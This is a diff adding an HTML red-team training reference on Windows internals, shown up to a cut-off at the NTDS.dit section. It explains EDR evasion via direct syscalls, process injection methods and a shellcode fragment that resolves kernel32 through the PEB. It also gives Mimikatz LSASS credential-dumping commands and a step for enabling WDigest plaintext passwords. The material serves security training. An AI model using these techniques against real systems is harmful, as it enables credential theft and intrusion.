@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Windows Internals for Red Team</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@500;600;700&family=Exo+2:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: #050810; color: #c0c8d0; font-family: 'Exo 2', sans-serif; font-size: 15px; line-height: 1.7; min-height: 100vh; }
+body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, rgba(0,212,255,0.02) 0px, rgba(0,212,255,0.02) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 9999; }
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: #050810; }
+::-webkit-scrollbar-thumb { background: #00d4ff; border-radius: 3px; }
+::selection { background: #00d4ff; color: #050810; }
+.sidebar { position: fixed; top: 0; left: 0; width: 240px; height: 100vh; background: #0a1020; border-right: 1px solid #1a1a2e; padding: 20px; overflow-y: auto; z-index: 1000; }
+.sidebar-logo { font-family: 'Share Tech Mono', monospace; font-size: 14px; color: #00d4ff; text-align: center; padding-bottom: 15px; border-bottom: 1px solid #1a1a2e; margin-bottom: 15px; }
+.sidebar-logo span { color: #ff3366; }
+.progress-container { margin-bottom: 15px; }
+.progress-label { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: #666; display: flex; justify-content: space-between; margin-bottom: 4px; }
+.progress-bar { height: 4px; background: #1a1a2e; border-radius: 2px; overflow: hidden; }
+.progress-fill { height: 100%; background: linear-gradient(90deg, #00d4ff, #00ff88); width: 0%; transition: width 0.4s ease; border-radius: 2px; }
+.sidebar-nav { list-style: none; }
+.sidebar-nav li { margin-bottom: 2px; }
+.sidebar-nav a { display: flex; align-items: center; gap: 8px; padding: 8px 10px; color: #8a8a9a; text-decoration: none; font-family: 'Rajdhani', sans-serif; font-size: 14px; font-weight: 500; border-radius: 4px; transition: all 0.2s; }
+.sidebar-nav a:hover { color: #00d4ff; background: rgba(0,212,255,0.05); }
+.sidebar-nav a.active { color: #00d4ff; background: rgba(0,212,255,0.08); }
+.nav-dot { width: 8px; height: 8px; border-radius: 50%; background: #1a1a2e; flex-shrink: 0; transition: background 0.3s; }
+.nav-dot.done { background: #00ff88; box-shadow: 0 0 6px rgba(0,255,136,0.4); }
+.nav-num { color: #555; font-family: 'Share Tech Mono', monospace; font-size: 11px; min-width: 18px; }
+.nav-label { flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.main-content { margin-left: 240px; padding: 0; }
+.hero { position: relative; padding: 80px 60px 60px; background: radial-gradient(ellipse at 50% 0%, rgba(0,212,255,0.06) 0%, transparent 60%), repeating-linear-gradient(90deg, rgba(0,212,255,0.03) 0px, rgba(0,212,255,0.03) 1px, transparent 1px, transparent 40px), repeating-linear-gradient(0deg, rgba(0,212,255,0.03) 0px, rgba(0,212,255,0.03) 1px, transparent 1px, transparent 40px); border-bottom: 1px solid #1a1a2e; overflow: hidden; }
+.hero h1 { font-family: 'Rajdhani', sans-serif; font-size: 52px; font-weight: 700; color: #fff; text-transform: uppercase; letter-spacing: 4px; position: relative; display: inline-block; animation: glitch 3s infinite; }
+.hero h1::before, .hero h1::after { content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+.hero h1::before { animation: glitch-top 3s infinite; clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%); -webkit-clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%); }
+.hero h1::after { animation: glitch-bottom 3s infinite; clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%); -webkit-clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%); }
+@keyframes glitch { 2%, 64% { transform: translate(0); } 4%, 60% { transform: translate(-2px); } 62% { transform: translate(2px); } }
+@keyframes glitch-top { 2%, 64% { transform: translate(0); } 4%, 60% { transform: translate(-2px, -1px); } 62% { transform: translate(2px, 1px); } }
+@keyframes glitch-bottom { 2%, 64% { transform: translate(0); } 4%, 60% { transform: translate(2px, 1px); } 62% { transform: translate(-2px, -1px); } }
+.hero-sub { font-family: 'Share Tech Mono', monospace; font-size: 14px; color: #00d4ff; margin-top: 10px; opacity: 0.8; letter-spacing: 2px; }
+.hero-desc { font-size: 16px; color: #7a7a8a; margin-top: 15px; max-width: 600px; line-height: 1.6; }
+.content-area { padding: 40px 60px 80px; }
+h2 { font-family: 'Rajdhani', sans-serif; font-size: 28px; font-weight: 600; color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+h2::before { content: '//'; color: #00d4ff; font-family: 'Share Tech Mono', monospace; font-size: 20px; }
+h3 { font-family: 'Rajdhani', sans-serif; font-size: 20px; font-weight: 600; color: #00d4ff; margin: 20px 0 10px; }
+h4 { font-family: 'Rajdhani', sans-serif; font-size: 17px; font-weight: 500; color: #bb86fc; margin: 15px 0 8px; }
+p { margin-bottom: 12px; }
+.module-card { background: #0a1020; border: 1px solid #1a1a2e; border-radius: 8px; margin-bottom: 20px; overflow: hidden; transition: border-color 0.3s; }
+.module-card:hover { border-color: #00d4ff; }
+.module-card.open { border-color: #00d4ff; }
+.module-header { display: flex; align-items: center; justify-content: space-between; padding: 16px 20px; cursor: pointer; user-select: none; border-left: 3px solid transparent; transition: all 0.3s; }
+.module-card:hover .module-header { border-left-color: #00d4ff; }
+.module-card.open .module-header { border-left-color: #00d4ff; background: rgba(0,212,255,0.03); }
+.module-title { font-family: 'Rajdhani', sans-serif; font-size: 18px; font-weight: 600; color: #fff; }
+.module-count { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: #666; }
+.module-chevron { color: #555; font-size: 14px; transition: transform 0.3s; }
+.module-card.open .module-chevron { transform: rotate(90deg); color: #00d4ff; }
+.module-body { display: none; padding: 0 20px 20px; border-top: 1px solid #1a1a2e; padding-top: 20px; }
+.module-card.open .module-body { display: block; }
+.ab { border-left: 3px solid #ff3366; background: #1a0a14; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; }
+.ib { border-left: 3px solid #00d4ff; background: #0a1420; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; }
+.lb { border-left: 3px solid #00ff88; background: #0a1a10; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; }
+.wb { border-left: 3px solid #ff8800; background: #1a1008; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; }
+.mm { border-left: 3px solid #bb86fc; background: #100a1a; padding: 15px; margin: 10px 0; border-radius: 0 8px 8px 0; font-style: italic; }
+.cb { background: #000; padding: 15px; margin: 10px 0; border-radius: 8px; font-family: 'Share Tech Mono', monospace; font-size: 13px; line-height: 1.6; overflow-x: auto; }
+.cmd { color: #00d4ff; } .cmt { color: #666; } .flg { color: #ff8800; } .val { color: #00ff88; } .pth { color: #bb86fc; }
+.ascii { background: #000; padding: 15px; margin: 10px 0; border-radius: 8px; color: #00d4ff; font-family: 'Share Tech Mono', monospace; white-space: pre; font-size: 12px; line-height: 1.4; overflow-x: auto; }
+.dtable { width: 100%; border-collapse: collapse; margin: 10px 0; }
+.dtable th { background: #0a1020; color: #00d4ff; padding: 8px 12px; border: 1px solid #1a1a2e; font-family: 'Rajdhani', sans-serif; font-size: 14px; text-align: left; font-weight: 600; }
+.dtable td { padding: 8px 12px; border: 1px solid #1a1a2e; font-size: 14px; }
+.dtable td:first-child { color: #00d4ff; font-family: 'Share Tech Mono', monospace; font-size: 13px; }
+.cl-item { display: flex; align-items: center; gap: 10px; padding: 8px 12px; margin: 4px 0; background: #0a1020; border-radius: 6px; cursor: pointer; transition: all 0.2s; }
+.cl-item::before { content: '⬜'; font-size: 18px; flex-shrink: 0; }
+.cl-item.done::before { content: '✅'; }
+.cl-item.done { color: #00ff88; text-decoration: line-through; }
+.module-tag { display: inline-block; padding: 2px 8px; border-radius: 3px; font-family: 'Share Tech Mono', monospace; font-size: 10px; background: rgba(0,212,255,0.1); color: #00d4ff; margin-left: 10px; letter-spacing: 1px; }
+@media (max-width: 768px) { .sidebar { width: 60px; padding: 10px; } .nav-label, .nav-num, .sidebar-logo span, .progress-container { display: none; } .main-content { margin-left: 60px; } .hero { padding: 40px 20px 30px; } .content-area { padding: 20px; } .hero h1 { font-size: 28px; } }
+</style>
+</head>
+<body>
+
+<div class="sidebar">
+<div class="sidebar-logo">[<span>RT</span>::WI]</div>
+<div class="progress-container">
+<div class="progress-label"><span>Progress</span><span id="progressText">0/0</span></div>
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+</div>
+<ul class="sidebar-nav" id="sidebarNav"></ul>
+</div>
+
+<div class="main-content">
+
+<section class="hero">
+<h1 data-text="WINDOWS INTERNALS">WINDOWS INTERNALS</h1>
+<div class="hero-sub">// FOR RED TEAM OPERATORS</div>
+<div class="hero-desc">A deep technical reference covering Windows operating system internals from an offensive security perspective. Master the kernel, bypass defenses, and own the domain.</div>
+</section>
+
+<div class="content-area" id="contentArea"></div>
+
+</div>
+
+<script>
+const modules = [
+{
+id: 'module-1',
+title: 'Windows Architecture Overview',
+tag: 'FUNDAMENTALS',
+count: 5,
+content: `
+<p>The Windows operating system is built on a layered architecture that separates privileged system code from user-mode applications. Understanding this architecture is critical for red team operators because every exploitation technique, privilege escalation path, and defensive evasion method is shaped by the boundary between <span class="cmd">user mode</span> and <span class="cmd">kernel mode</span>.</p>
+
+<p>At the heart of Windows is the NT kernel (ntoskrnl.exe), which provides core services like thread scheduling, memory management, and I/O. The kernel runs in ring 0, the most privileged CPU level. User applications run in ring 3 and must transition through the Windows Executive to request kernel services. This transition happens via <span class="cmd">system calls</span> (syscalls), which are the fundamental mechanism by which user-mode code invokes kernel operations.</p>
+
+<div class="ascii">Windows Architecture (Simplified):
+┌─────────────────────────────────────────────┐
+│              USER MODE (Ring 3)             │
+│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
+│  │  Win32   │  │  Native  │  │  .NET /  │  │
+│  │  App     │  │  App     │  │  Other   │  │
+│  └────┬─────┘  └────┬─────┘  └────┬─────┘  │
+│       │              │              │        │
+│  ┌────┴──────────────┴──────────────┴─────┐  │
+│  │         ntdll.dll (syscall stubs)      │  │
+│  └────────────────┬───────────────────────┘  │
+├───────────────────┼─────────────────────────┤
+│             KERNEL MODE (Ring 0)            │
+│  ┌────────────────┴───────────────────────┐  │
+│  │     System Service Dispatcher          │  │
+│  │     (KiSystemService/SystemCall)       │  │
+│  └────────────────┬───────────────────────┘  │
+│  ┌────────────────┴───────────────────────┐  │
+│  │      Windows Executive (ntoskrnl)      │  │
+│  │  ┌──────┐┌──────┐┌──────┐┌──────┐    │  │
+│  │  │ Proc ││ Mem  ││ Obj  ││ I/O  │ ... │  │
+│  │  │ Mgr  ││ Mgr  ││ Mgr  ││ Mgr  │    │  │
+│  │  └──────┘└──────┘└──────┘└──────┘    │  │
+│  └────────────────┬───────────────────────┘  │
+│  ┌────────────────┴───────────────────────┐  │
+│  │         HAL + Device Drivers           │  │
+│  └────────────────────────────────────────┘  │
+└─────────────────────────────────────────────┘</div>
+
+<p>The transition from user mode to kernel mode is mediated by the System Service Dispatch Table (SSDT) and the <span class="cmd">KiSystemCall64</span> function on x64 systems. When a user-mode application calls <span class="cmd">ReadFile</span>, it goes through <span class="pth">kernel32.dll</span> &rarr; <span class="pth">ntdll.dll</span> &rarr; syscall instruction. The syscall number identifies which kernel function to execute. Security products like EDRs hook these functions in ntdll.dll to monitor syscall invocations, which is why red team techniques like <span class="flg">direct syscalls</span> are so valuable.</p>
+
+<div class="ib">Windows 10 and 11 use a different syscall number set on each build. Tools like <span class="cmd">SysWhispers2</span> and <span class="cmd">Hell's Gate</span> dynamically resolve syscall numbers at runtime to avoid static signatures.</div>
+
+<div class="ab">For red team operators, the architecture boundary between user and kernel mode is the most important concept to understand. Every EDR hook, every AV scan, every process injection technique operates within constraints defined by this separation. Direct syscalls bypass user-mode hooks. Kernel callbacks are used by EDRs to detect process creation. Understanding which side of the boundary each detection mechanism operates on lets you choose the right evasion technique.</div>
+
+<h3>Key Components of the Windows Executive</h3>
+<p>The Windows Executive consists of several manager components that provide core OS services. The Object Manager handles all named kernel objects. The Process Manager handles process and thread creation. The Memory Manager provides virtual memory services. The I/O Manager handles all device communication. The Configuration Manager implements the Registry. The Security Reference Monitor (SRM) enforces access checks and generates audit logs.</p>
+
+<div class="mm">Mental Model: Think of Windows as an onion. User mode is the outer layer where applications live. Each inner layer provides services to the layer outside it. The kernel is the core. EDRs insert themselves between layers to monitor activity. To evade, you need to operate at a deeper layer than the EDR is monitoring.</div>
+
+<h3>User Mode vs Kernel Mode: The Security Boundary</h3>
+<p>The CPU enforces the privilege level through the Current Privilege Level (CPL) in the CS register. Ring 0 (kernel) has full access to system memory, hardware, and all CPU instructions. Ring 3 (user) is restricted and must use syscalls for privileged operations. This hardware-enforced separation is fundamental to Windows security. Bootkits and rootkits that run in kernel mode can subvert this separation entirely, which is why driver signing and Secure Boot are critical defenses.</p>
+
+<div class="wb">Modern Windows systems enable Kernel Driver Signing enforcement. Unsigned drivers cannot load on 64-bit systems. PatchGuard (Kernel Patch Protection) prevents patching kernel code and structures. These protections make traditional kernel-mode rootkits much harder to deploy.</div>
+
+<h3>Attack Surface Summary</h3>
+<table class="dtable">
+<tr><th>Component</th><th>Attack Surface</th><th>Relevance</th></tr>
+<tr><td>Win32 API</td><td>Hooked by EDR, monitored by ETW</td><td>Bypass with direct syscalls</td></tr>
+<tr><td>ntdll.dll</td><td>User-mode syscall stubs</td><td>Hell's Gate / Halo's Gate</td></tr>
+<tr><td>SSDT</td><td>Can be modified by kernel drivers</td><td>Requires admin + driver load</td></tr>
+<tr><td>Kernel Callbacks</td><td>Registered by security products</td><td>Process, thread, image load callbacks</td></tr>
+<tr><td>Device Drivers</td><td>Vulnerable drivers can be exploited</td><td>Bring Your Own Vulnerable Driver (BYOVD)</td></tr>
+</table>
+
+<div class="lb"><strong>Lab:</strong> On a test system, use Process Monitor from Sysinternals to observe the flow of a simple file read operation. Note the call stack from the user-mode application through kernel32.dll to ntdll.dll and into the kernel. Then compile and run a C program that uses NtCreateFile directly from ntdll.dll using GetModuleHandle and GetProcAddress. Observe the difference in the call stack.</div>
+
+<div class="cl-item">Explain the difference between user mode and kernel mode privilege levels</div>
+<div class="cl-item">Trace a syscall from user application to kernel service through ntdll.dll</div>
+<div class="cl-item">Describe how EDRs hook user-mode API functions and how direct syscalls bypass this</div>
+<div class="cl-item">Identify the key Windows Executive manager components and their roles</div>
+<div class="cl-item">Understand PatchGuard and driver signing requirements on modern Windows</div>
+`
+},
+{
+id: 'module-2',
+title: 'Processes and Threads',
+tag: 'CORE CONCEPTS',
+count: 5,
+content: `
+<p>Processes and threads are the fundamental units of execution in Windows. A process provides a virtual address space, a security context (token), and handles to system resources. Threads are the units of execution within a process, each with its own stack, register context, and scheduling state. For red team operators, understanding the Windows process model is essential for process injection, persistence, and evasion.</p>
+
+<p>Every Windows process begins with a call to <span class="cmd">CreateProcess</span>, which internally calls <span class="cmd">NtCreateUserProcess</span> in ntdll.dll. The kernel's Process Manager creates the EPROCESS structure, which is the kernel's representation of a process. This structure contains the process ID, token, virtual address space descriptors, handle table pointer, and many other fields used by the kernel and security products.</p>
+
+<div class="ascii">Process Creation Flow:
+CreateProcess (kernel32.dll)
+  └─ CreateProcessInternal
+       └─ NtCreateUserProcess (ntdll.dll)
+            └─ syscall → kernel mode
+                 └─ PsCreateProcess
+                      └─ Create EPROCESS structure
+                      └─ Initialize address space
+                      └─ Set process token
+                      └─ Insert into handle table
+                      └─ Call process creation callbacks (EDR!)
+                      └─ Create initial thread (PspCreateThread)
+                           └─ Call thread creation callbacks (EDR!)</div>
+
+<p>The EPROCESS structure is crucial for red team tooling. Tools like Process Hacker, WinDbg, and custom drivers read EPROCESS fields to enumerate processes, identify parent-child relationships, and manipulate process tokens. The _EPROCESS structure contains the ActiveProcessLinks list entry, which connects all processes in a doubly-linked list. Unlinking a process from this list is a classic rootkit technique to hide from task managers.</p>
+
+<div class="ib">The Process Environment Block (PEB) is a user-mode structure pointed to by the <span class="cmd">_TEB.ProcessEnvironmentBlock</span> field. It contains the process's command line, module list, heap information, and being debugged flag. The <span class="cmd">BeingDebugged</span> field at offset 0x2 is commonly checked by anti-debugging code.</div>
+
+<h3>Thread Internals</h3>
+<p>Threads are represented in the kernel by the ETHREAD structure. Each thread has a Thread Environment Block (TEB) in user mode, which contains the thread's stack limits, exception handlers, Thread Local Storage (TLS) array, and the last error value (GetLastError). Threads are scheduled by the Windows scheduler based on priority levels from 0 to 31. The scheduler uses a priority-driven, preemptive model with round-robin for equal priorities.</p>
+
+<h3>Process Injection Techniques</h3>
+<p>Process injection is the cornerstone of many red team operations. Understanding the underlying Windows APIs and structures enables operators to choose the right injection technique for each scenario. Classic <span class="cmd">CreateRemoteThread</span> injection uses <span class="pth">kernel32.dll</span> functions that EDRs heavily monitor. Modern alternatives include thread hijacking, APC injection, and atom bombing.</p>
+
+<div class="ab"><strong>Attack Relevance:</strong> EDRs register process creation callbacks via <span class="cmd">PsSetCreateProcessNotifyRoutine</span> to monitor every new process. They register thread creation callbacks via <span class="cmd">PsSetCreateThreadNotifyRoutine</span>. These callbacks execute in kernel mode and cannot be bypassed from user mode. However, you can minimize detection by injecting into trusted processes, using handle duplication, or exploiting DLL search order.</div>
+
+<div class="ascii">Common Process Injection Vectors:
+┌─────────────────────────────────────────────┐
+│  CreateRemoteThread         │  Monitor: High │
+│  └─ VirtualAllocEx + WriteProcessMemory     │
+│  └─ CreateRemoteThread                      │
+├─────────────────────────────────────────────┤
+│  Thread Hijacking           │  Monitor: Med  │
+│  └─ Suspend Thread + SetThreadContext       │
+│  └─ Resume Thread + RtlUserThreadStart      │
+├─────────────────────────────────────────────┤
+│  APC Injection              │  Monitor: Med  │
+│  └─ QueueUserAPC to alertable thread        │
+├─────────────────────────────────────────────┤
+│  Process Hollowing          │  Monitor: High │
+│  └─ CreateProcess suspended                 │
+│  └─ NtUnmapViewOfSection + WriteProcessMem  │
+│  └─ SetThreadContext + ResumeThread         │
+├─────────────────────────────────────────────┤
+│  Direct Syscall Injection   │  Monitor: Low  │
+│  └─ NtCreateThreadEx via syscall directly   │
+└─────────────────────────────────────────────┘</div>
+
+<div class="lb"><strong>Lab:</strong> Write a C program that enumerates running processes using <span class="cmd">CreateToolhelp32Snapshot</span> and lists each process's PID, parent PID, and executable path. Then modify the program to open a target process with <span class="cmd">OpenProcess</span> and query its PEB using <span class="cmd">NtQueryInformationProcess</span> with the ProcessBasicInformation class. Observe the PEB structure fields, particularly the command line and module list.</div>
+
+<div class="wb">Process injection is heavily signatured by AV/EDR products. <span class="cmd">VirtualAllocEx</span> followed by <span class="cmd">WriteProcessMemory</span> followed by <span class="cmd">CreateRemoteThread</span> is a classic pattern that triggers immediate alerts. Modern C2 frameworks use alternative techniques like process hollowing without RWX pages, thread execution hijacking, or direct syscalls.</div>
+
+<div class="mm">Mental Model: A process is a container with walls (virtual address space), an ID badge (token), and a phone book (handle table). Threads are the workers inside the container. Injection is sneaking your worker inside someone else's container. EDRs are security guards watching the doors. Direct syscalls are secret tunnels that bypass the guards.</div>
+
+<div class="cl-item">Explain the relationship between a process and its threads</div>
+<div class="cl-item">Describe the EPROCESS structure and its key fields relevant to red teaming</div>
+<div class="cl-item">List and compare at least three process injection techniques</div>
+<div class="cl-item">Explain how EDRs monitor process and thread creation via kernel callbacks</div>
+<div class="cl-item">Implement basic process enumeration using the Windows Toolhelp API</div>
+`
+},
+{
+id: 'module-3',
+title: 'Windows Memory Management',
+tag: 'EXPLOITATION',
+count: 5,
+content: `
+<p>Windows memory management is a sophisticated system that provides each process with a private virtual address space while efficiently managing physical memory across all running processes. Understanding the virtual memory model is essential for shellcode development, exploit writing, memory scraping, and understanding how ASLR and DEP work at the hardware level.</p>
+
+<p>Every Windows process on a 64-bit system gets a 128TB virtual address space, split into user space (lower 8TB) and kernel space (upper 8TB, shared across all processes). This virtual address space is divided into pages (typically 4KB), and the Memory Manager uses a page table hierarchy to translate virtual addresses to physical addresses. The CPU's Memory Management Unit (MMU) performs this translation transparently.</p>
+
+<div class="ascii">Virtual Address Translation (x64):
+Virtual Address: 0x7FFF'1234'5678
+                 ││││  ││││  ││││
+Bit Positions:   47 39 30 21 12  0
+                 │  │  │  │  │
+                 │  │  │  │  └─ Page Offset (12 bits)
+                 │  │  │  └──── PT Index (9 bits)
+                 │  │  └─────── PD Index (9 bits)
+                 │  └────────── PDP Index (9 bits)
+                 └───────────── PML4 Index (9 bits)
+
+PML4 → PDP → PD → PT → Physical Page + Offset
+(512 entries each, 9-bit index = 512 entries per table)</div>
+
+<h3>Address Space Layout Randomization (ASLR)</h3>
+<p>ASLR randomizes the base addresses of executables, DLLs, the stack, and heap at process startup. On modern Windows, ASLR is mandatory for all system DLLs and is enabled by default for all applications linked with <span class="cmd">/DYNAMICBASE</span>. The kernel randomizes the process's address space by loading images at random offsets, randomizing the PEB and TEB addresses, and randomizing stack and heap base addresses.</p>
+
+<div class="ab"><strong>Attack Relevance:</strong> ASLR is the primary defense preventing shellcode from knowing where to find APIs. Bypasses include: <span class="cmd">(1)</span> Information leaks to leak base addresses, <span class="cmd">(2)</span> Relative addressing using ROP gadgets, <span class="cmd">(3)</span> Process-specific techniques like using the PEB to find kernel32.dll base address via the InMemoryOrderModuleList.</div>
+
+<h3>Data Execution Prevention (DEP)</h3>
+<p>DEP uses the NX (No Execute) bit on modern CPUs to mark memory pages as non-executable by default. The stack, heap, and data sections are non-executable. Only explicitly allocated executable memory (e.g., via <span class="cmd">VirtualAlloc</span> with <span class="flg">PAGE_EXECUTE_READWRITE</span>) can contain code that the CPU will execute. This prevents classic shellcode injection that places code on the stack or heap.</p>
+
+<div class="ib">The <span class="cmd">VirtualAlloc</span> function is the primary way to allocate executable memory. Its usage is heavily monitored by EDRs. The pattern of <span class="cmd">VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)</span> is an immediate red flag. Shellcode loaders increasingly use indirect techniques: allocate RW memory, write shellcode, use <span class="cmd">VirtualProtect</span> to change to RX, or use write-what-where gadgets.</div>
+
+<h3>Shellcode Fundamentals</h3>
+<p>Shellcode is position-independent code that executes within a target process. It must resolve all addresses dynamically because it cannot know where it will be loaded. The standard technique is to use the PEB to walk the module list and find kernel32.dll, then parse its export table to find <span class="cmd">LoadLibraryA</span> and <span class="cmd">GetProcAddress</span>, which can then be used to resolve any API.</p>
+
+<div class="cb"><span class="cmt">; Assembly fragment: Find kernel32 via PEB (x64)</span>
+<span class="cmd">xor</span> <span class="val">rcx</span>, <span class="val">rcx</span>
+<span class="cmd">mov</span> <span class="val">rax</span>, <span class="val">gs</span>:[<span class="val">0x60</span>]    <span class="cmt">; PEB</span>
+<span class="cmd">mov</span> <span class="val">rax</span>, [<span class="val">rax</span> + <span class="val">0x18</span>]   <span class="cmt">; PEB-LDR</span>
+<span class="cmd">mov</span> <span class="val">rax</span>, [<span class="val">rax</span> + <span class="val">0x20</span>]   <span class="cmt">; InMemoryOrderLinks</span>
+<span class="cmd">mov</span> <span class="val">rax</span>, [<span class="val">rax</span>]           <span class="cmt">; Second entry (ntdll)</span>
+<span class="cmd">mov</span> <span class="val">rax</span>, [<span class="val">rax</span>]           <span class="cmt">; Third entry (kernel32)</span>
+<span class="cmd">mov</span> <span class="val">r10</span>, [<span class="val">rax</span> + <span class="val">0x20</span>]   <span class="cmt">; kernel32 base address</span>
+<span class="cmt">; Now parse PE headers of kernel32 to find export table</span></div>
+
+<h3>Memory Scanning and Forensic Considerations</h3>
+<p>When your shellcode or implant lives in a process's memory, it can be found by memory scanners. EDRs and memory scanners enumerate memory regions using <span class="cmd">NtQueryVirtualMemory</span> and look for executable anonymous mappings, suspicious permissions (RWX), or known shellcode signatures. Packers and encoders (like those in Metasploit or Shikata Ga Nai) are designed to evade signature-based detection, but behavioral detection of memory allocation patterns is harder to bypass.</p>
+
+<div class="lb"><strong>Lab:</strong> Write a PowerShell script that uses <span class="cmd">Add-Type</span> with C# code to call <span class="cmd">VirtualQueryEx</span> on a target process. Enumerate all memory regions, showing their base address, size, and protection flags. Identify regions that are executable (PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE) and note how many RWX regions exist. This is how memory scanners detect potentially malicious memory.</div>
+
+<div class="wb">Windows Defender and EDRs scan memory in real time. The kernel-mode memory scanner (<span class="cmd">MsMpEng.exe</span>) can read process memory from kernel mode. Setting PAGE_NOACCESS on sensitive memory regions can prevent reading but will crash the process on access. Memory encryption is theoretically possible but introduces performance overhead.</div>
+
+<div class="mm">Mental Model: Virtual memory is like a library with a card catalog. Each process has its own catalog (page tables) mapping book titles (virtual addresses) to shelf locations (physical pages). ASLR is like randomly reshelving books each time the library opens. DEP is like putting a glass case around books that says "look but don't touch." Shellcode is a book that needs to be placed on the right shelf and needs to know the card catalog system.</div>
+
+<div class="cl-item">Explain the 4-level page table hierarchy in x64 Windows memory translation</div>
+<div class="cl-item">Describe how ASLR prevents shellcode from hardcoding API addresses</div>
+<div class="cl-item">Explain how DEP/NX prevents classic stack-based shellcode execution</div>
+<div class="cl-item">Write the algorithm for resolving kernel32 base from the PEB</div>
+<div class="cl-item">Identify executable memory regions using VirtualQuery in a target process</div>
+`
+},
+{
+id: 'module-4',
+title: 'Windows Authentication',
+tag: 'CREDENTIALS',
+count: 5,
+content: `
+<p>Windows authentication is a multi-layered system that has evolved from simple password hashing in LAN Manager to the modern Kerberos-based Active Directory authentication. Understanding the authentication architecture is critical for red team operators because credential theft, lateral movement, and privilege escalation all depend on manipulating authentication tokens, tickets, and hashes.</p>
+
+<p>The Security Account Manager (SAM) database stores local user credentials on standalone Windows systems. Located at <span class="pth">C:\\Windows\\System32\\config\\SAM</span>, it is locked by the kernel while Windows is running. The SAM stores LM and NT hashes for local accounts. The LM hash is the legacy DES-based hash that is trivially crackable; Windows Vista and later disable LM by default. The NT hash is the MD4-based hash of the UTF-16LE password.</p>
+
+<div class="ascii">Windows Authentication Flow (Local Logon):
+User Logon → WinLogon → LSASS
+                        │
+                        ├─ Load user profile
+                        ├─ Verify password hash against SAM
+                        ├─ Create access token
+                        │   ├─ User SID
+                        │   ├─ Group SIDs
+                        │   └─ Privileges
+                        ├─ Start user shell (explorer.exe)
+                        └─ Session management</div>
+
+<p>LSASS (Local Security Authority Subsystem Service) is the process that handles authentication on Windows. It runs as <span class="pth">C:\\Windows\\System32\\lsass.exe</span> and holds all authentication data in memory, including NT hashes, Kerberos tickets, and cached credentials. This makes LSASS the primary target for credential theft tools like Mimikatz. LSASS can be configured to run as Protected Process Light (PPL) on Windows 8.1+, which prevents even administrative processes from opening it with full access.</p>
+
+<div class="ab"><strong>Attack Relevance:</strong> Mimikatz's <span class="cmd">sekurlsa::logonpasswords</span> opens LSASS with <span class="flg">PROCESS_VM_READ</span> and <span class="flg">PROCESS_QUERY_INFORMATION</span>, then parses the internal data structures to extract passwords, hashes, and tickets. Bypassing LSASS protection requires kernel-level access (mimikatz driver), process injection into a PPL-compatible process, or using the <span class="cmd">SeDebugPrivilege</span> combined with the appropriate obfuscation.</div>
+
+<h3>NTLM Authentication</h3>
+<p>NTLM is a challenge-response authentication protocol used when Kerberos is unavailable. The client proves knowledge of the password by performing cryptographic operations on a server-provided challenge. NTLM uses the NT hash. The protocol has several weaknesses: it does not support multi-factor authentication, it is vulnerable to pass-the-hash attacks (the NT hash IS the password for NTLM), and relay attacks can forward authentication to other services.</p>
+
+<div class="ascii">NTLM Authentication Flow:
+Client                          Server
+  │                                │
+  │──── Negotiate ────────────────→│
+  │←─── Challenge (16 bytes) ─────│
+  │──── Response (HMAC-MD5) ─────→│
+  │                                │
+  │  Response = HMAC-MD5(NT Hash, │
+  │    ServerChallenge + Data)    │
+  │                                │
+  │  If server is DC, it sends     │
+  │  Net-NTLMv1/v2 hash to DC      │
+  │  for verification              │
+  │                                │</div>
+
+<h3>Kerberos Authentication</h3>
+<p>Kerberos is the default authentication protocol in Active Directory domains. It uses tickets and a trusted third party (the Key Distribution Center, KDC) to authenticate users without sending passwords over the network. The KDC runs on Domain Controllers and provides Ticket Granting Tickets (TGTs) and Service Tickets (STs). Kerberos is more secure than NTLM but introduces the concept of Kerberos tickets as attack targets.</p>
+
+<table class="dtable">
+<tr><th>Component</th><th>Description</th><th>Red Team Relevance</th></tr>
+<tr><td>TGT</td><td>Ticket Granting Ticket (encrypted with krbtgt hash)</td><td>Golden Ticket: Forge TGT with krbtgt hash</td></tr>
+<tr><td>ST</td><td>Service Ticket (encrypted with target service's hash)</td><td>Silver Ticket: Forge ST for specific service</td></tr>
+<tr><td>krbtgt</td><td>Account used by KDC to encrypt TGTs</td><td>Most valuable hash in the domain</td></tr>
+<tr><td>AS-REP</td><td>Authentication Service response</td><td>AS-REP Roasting: Get hash without password</td></tr>
+<tr><td>TGS-REP</td><td>Ticket Granting Service response</td><td>Kerberoasting: Extract service account hashes</td></tr>
+</table>
+
+<div class="lb"><strong>Lab:</strong> Use Mimikatz (in a controlled lab environment) to extract credentials from LSASS. Run <span class="cmd">sekurlsa::logonpasswords</span> and <span class="cmd">sekurlsa::tickets</span>. Observe the data returned including NTLM hashes and Kerberos tickets. Then use <span class="cmd">lsadump::sam</span> to dump local SAM hashes. Practice enabling WDigest to see plaintext passwords on systems where it is disabled by default.</div>
+
+<h3>NTDS.dit: The Domain Database</h3>
